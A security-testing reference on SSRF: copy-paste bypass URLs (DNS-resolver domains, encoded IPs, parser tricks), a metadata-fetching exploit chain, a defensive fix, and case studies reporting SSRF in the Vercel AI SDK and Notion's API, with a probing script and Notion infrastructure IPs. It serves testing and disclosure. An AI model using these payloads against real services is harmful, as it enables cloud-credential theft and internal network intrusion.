# SSRF Bypass Techniques Reference

Systematic reference for testing Server-Side Request Forgery (SSRF) protections in URL validation code. Covers DNS resolver bypasses, URL parser differentials, redirect chain exploits, and confirmation methodology.

## DNS Resolver Bypass Services

These domains programmatically resolve to arbitrary IPs. They are the most common and most reliable SSRF bypass because they look like regular domains to naive hostname checks.

| Domain | Resolution Pattern | PoC URL |
|--------|-------------------|---------|
| `localtest.me` | Always → 127.0.0.1 | `http://localtest.me/` |
| `lvh.me` | Always → 127.0.0.1 | `http://lvh.me/` |
| `*.nip.io` | `*.X.X.X.X.nip.io` → X.X.X.X | `http://169.254.169.254.nip.io/` |
| `*.sslip.io` | `*.X.X.X.X.sslip.io` → X.X.X.X | `http://169.254.169.254.sslip.io/` |

## Full Test Vector Set

Copy-paste ready for testing any URL validation function:

```
# === DIRECT PRIVATE IPS (should be blocked) ===
http://127.0.0.1/
http://10.0.0.1/
http://192.168.1.1/
http://169.254.169.254/latest/meta-data/
http://localhost/

# === DNS RESOLVER BYPASS (likely bypassed) ===
http://localtest.me/
http://lvh.me/
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/latest/meta-data/
http://10.0.0.1.nip.io/
http://192.168.1.1.nip.io/
http://127.0.0.1.sslip.io/
http://169.254.169.254.sslip.io/

# === URL PARSER DIFFERENTIALS ===
# Node.js URL class normalizes these. Test when code uses custom URL parsing.
http://0x7f000001/              # hex → 127.0.0.1
http://2130706433/               # decimal → 127.0.0.1
http://017700000001/             # octal → 127.0.0.1
http://0x7f.0x0.0x0.0x1/        # hex dotted → 127.0.0.1
http://127.1/                    # shorthand → 127.0.0.1
http://0/                        # zero shorthand → 0.0.0.0
http://127.0.00.001/             # leading zeros → 127.0.0.1
http://127.0.0.01/               # leading zeros → 127.0.0.1 (isIPv4 may reject)
http://[::ffff:7f00:1]/          # IPv4-mapped IPv6 hex → 127.0.0.1
http://[0:0:0:0:0:ffff:7f00:1]/ # full IPv6 → 127.0.0.1
http://[::ffff:127.0.0.1]/      # IPv4-mapped IPv6 standard
http://[::1]/                    # IPv6 loopback
http://[::]/                     # IPv6 unspecified → 0.0.0.0
http://[fc00::1]/                # IPv6 unique local
http://[fe80::1]/                # IPv6 link-local

# === CREDENTIAL IN URL (auth parsing differential) ===
http://user:pass@127.0.0.1/     # credentials parsed, hostname = 127.0.0.1
http://example.com@127.0.0.1/   # some parsers see 127.0.0.1 as hostname
http://127.0.0.1:80@evil.com/   # some parsers see evil.com as hostname
http://evil.com#@127.0.0.1/     # fragment trick
```

## Testing Methodology

### Step 1: Unit test the validation function

```typescript
// Direct test — isolate the validation from the fetch
import { validateSomeUrl } from './some-module';

const bypassHosts = [
  'http://localtest.me/',
  'http://lvh.me/',
  'http://169.254.169.254.nip.io/latest/meta-data/',
];

let bypassCount = 0;
for (const url of bypassHosts) {
  try {
    validateSomeUrl(url);
    console.log(`BYPASS: ${url}`);  // <-- this is the finding
    bypassCount++;
  } catch (e) {
    console.log(`BLOCKED: ${url}`);
  }
}
console.log(`${bypassCount}/${bypassHosts.length} bypassed`);
```

### Step 2: Verify DNS resolution

```bash
# Confirm the domain actually resolves to the expected private IP
nslookup localtest.me       # → 127.0.0.1
nslookup 169.254.169.254.nip.io  # → 169.254.169.254

# Or via Node.js:
node -e "require('dns').resolve4('localtest.me', (e,r) => console.log(r))"
```

### Step 3: Confirm the full exploit chain

```typescript
// After validation passes, the code calls fetch()
// If you can run the actual download function, start a local HTTP server
// and verify the connection actually reaches your server/localhost

// For cloud metadata testing (safely):
fetch('http://169.254.169.254.nip.io/latest/meta-data/')
  .then(r => r.text())
  .then(console.log)  // If this returns metadata, SSRF confirmed
```

## Redirect Chain SSRF

If the code re-validates the URL after redirects, try a redirect to a DNS-resolver domain:

```
1. Set up: public-URL.com/redirect → http://169.254.169.254.nip.io/
2. Initial validation: public-URL.com (passes, legitimate domain)
3. fetch follows redirect → http://169.254.169.254.nip.io/
4. Redirect validation: 169.254.169.254.nip.io (not a bare IP, passes)
5. DNS resolves → 169.254.169.254
6. SSRF confirmed
```

## Fix Pattern

The correct fix is to resolve DNS before making the HTTP request:

**Node.js (async):**
```typescript
import * as dns from 'node:dns/promises';

const addresses = await dns.resolve4(hostname, { hints: dns.ALL });
for (const address of addresses) {
  if (isPrivateIP(address)) {
    throw new Error('URL resolves to a private IP');
  }
}
```

**Web/Edge runtimes that lack raw DNS:**
Block known DNS resolver services by pattern:
```typescript
const KNOWN_RESOLVERS = [
  /\.nip\.io$/i, /\.sslip\.io$/i, /\.xip\.io$/i,
  /^localtest\.me$/i, /^lvh\.me$/i,
];
if (KNOWN_RESOLVERS.some(p => p.test(hostname))) {
  throw new Error('URL uses a known DNS resolution service');
}
```

## Case Study: Vercel AI SDK SSRF (Confirmed)

**Target**: `@ai-sdk/provider-utils` v5.0.0-canary.44
**File**: `packages/provider-utils/src/validate-download-url.ts`
**Result**: 8/8 bypass URLs passed validation
**Impact**: High — cloud metadata exfiltration (AWS, GCP, Azure), internal network scanning

The function blocks literal private IPs and known localhost names, but **never resolves DNS**. All DNS-resolver domains pass, including `169.254.169.254.nip.io` which triggers AWS metadata SSRF.

**See also**: `packages/ai/src/util/download/download.ts` (caller), `packages/ai/src/prompt/convert-to-language-model-prompt.ts` (entry point for user-provided file URLs)

## Case Study: Notion API SSRF (Confirmed, Two Vectors)

**Target**: Notion Labs — `api.notion.com`
**Date**: 2026-05-30
**Result**: 2 SSRF vectors confirmed, 7+ internal IP URLs accepted

### Vector 1: Embed/Bookmark Block URL Injection (HTTP + HTTPS)
- **API**: `PATCH /v1/blocks/{id}/children` with `type: embed` or `type: bookmark`
- **URL validation**: None — `http://localtest.me/`, `http://169.254.169.254.nip.io/` all accepted
- **Block types affected**: embed, bookmark, image, video, audio, file
- **Fetcher services**: NotionEmbedder (HEAD, IP `131.149.232.x`) + Iframely/1.3.1 (GET, IP `44.199.21.82` / `54.162.72.45`)
- **Confirmed via**: Webhook.site — 14+ requests received from Notion's infrastructure

### Vector 2: File Upload External URL (HTTPS only)
- **API**: `POST /v1/file_uploads` with `mode: external_url`
- **URL validation**: HTTPS URLs only, but no private IP checking
- **Fetcher services**: notion-api (HEAD, IP `131.149.232.x`) + notion (GET, IP `131.149.232.x`)
- **File import**: Status changed from `pending` to `uploaded` — content was fetched and stored
- **Separate infrastructure**: Different services from embed (no Iframely involvement)

### Notion Infrastructure Identified

| Service | User-Agent | Method | IP(s) | Trigger |
|---------|-----------|--------|-------|---------|
| NotionEmbedder | `NotionEmbedder` | HEAD | `131.149.232.139/.151/.198/.214` | Embed/bookmark blocks |
| notion-api | `notion-api` | HEAD | `131.149.232.152/.204` | File upload |
| notion | `notion` | GET | `131.149.232.136/.138` | File upload |
| Iframely | `Iframely/1.3.1 (+https://iframely.com/docs/about) Notion` | GET | `44.199.21.82`, `44.194.139.157`, `52.2.214.255`, `54.162.72.45`, `100.29.130.36` | Embed/bookmark blocks |

### Blind SSRF Note
Fetched content is NOT stored in the embed block's API representation — the SSRF is **blind** for embed blocks. The file upload does store the content. Redirect-following was NOT confirmed (Iframely did not follow 302 redirects in testing). Exploitation requires direct URL injection, DNS rebinding, or side-channel timing.

### Verification Script
```python
# Create embed with private IP URL — all accepted with zero validation
for url in ["http://localtest.me/", "http://169.254.169.254.nip.io/latest/meta-data/",
            "http://10.0.0.1:8080/", "http://192.168.1.1/", "http://127.0.0.1:6379/"]:
    resp = requests.patch(f"https://api.notion.com/v1/blocks/{pid}/children",
        headers={"Authorization": f"Bearer {token}", "Notion-Version": "2026-03-11"},
        json={"children": [{"object": "block", "type": "embed", "embed": {"url": url}}]})
    assert resp.status_code == 200, f"{url} was rejected"
```
